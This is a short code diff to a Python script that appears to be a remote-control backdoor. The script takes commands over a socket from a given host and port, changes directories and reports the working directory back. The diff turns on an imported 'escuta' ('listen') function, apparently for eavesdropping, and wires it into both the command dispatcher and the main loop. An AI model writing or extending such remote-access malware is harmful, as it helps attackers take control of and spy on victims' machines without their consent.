@@ -23,7 +23,7 @@ import os
 import subprocess
 import argparse 
 
-#from escuta import escuta
+from escuta import escuta
 
 s = None
 connected = False
@@ -61,6 +61,8 @@ def main(host, port):
                         if len(commands) > 1:
                             os.chdir(commands[1])
                         s.send(os.getcwd())
+                    elif commands[0] == "escuta":
+                         escuta()
                     elif commands[0] == "pwd":
                         s.send(os.getcwd())             
                     elif commands[0] == "opencd":
@@ -116,7 +118,7 @@ if __name__ == "__main__":
     while True:
         try:
             main(host, port)
-   #        escuta()
+            escuta()
     #        time()
         except KeyboardInterrupt:
             # Close connection, if exists
